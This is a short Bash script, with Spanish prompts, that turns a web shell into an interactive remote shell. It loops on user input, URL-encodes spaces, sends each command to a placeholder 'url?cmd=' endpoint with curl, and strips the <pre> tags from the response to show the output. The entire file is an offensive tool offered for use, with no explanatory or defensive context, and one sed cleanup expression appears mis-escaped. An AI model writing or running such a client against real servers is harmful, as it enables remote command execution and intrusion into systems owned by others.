#!/bin/bash

function ctrl_c(){
  echo -e "\n\n[!] Saliendo...\n"
  exit 1
}

# Ctrl+C
trap ctrl_c INT

main_url="url?cmd="

while [ "$command" != "exit" ]; do
  echo -n "$~ " && read -r command
  command="$(echo $command | tr ' ' '+')"

  curl -s -X GET "$main_url$command" | grep "<pre>" -A 100 | grep "</pre>" -B 100 | sed 's/<pre>//' | sed 's/<\pre>//'
done
